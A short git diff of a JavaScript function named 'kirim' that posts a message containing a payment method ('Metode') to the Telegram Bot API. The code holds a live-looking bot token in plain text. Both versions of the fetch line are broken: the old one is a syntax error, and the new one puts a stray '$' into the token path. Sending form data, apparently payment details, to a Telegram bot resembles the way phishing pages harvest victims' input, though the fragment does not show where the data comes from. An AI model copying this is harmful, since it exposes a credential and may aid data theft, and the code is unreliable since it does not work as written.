@@ -16,7 +16,7 @@ function kirim(){
 🏦 Metode: ${metode}
 `;
 
-    fetch(`https://api.telegram.org/bot${8646361372:AAFxdpEs_KGHb63pBoZTHhR7PCYAZfWpEBA}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot$8646361372:AAFxdpEs_KGHb63pBoZTHhR7PCYAZfWpEBA/sendMessage`, {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
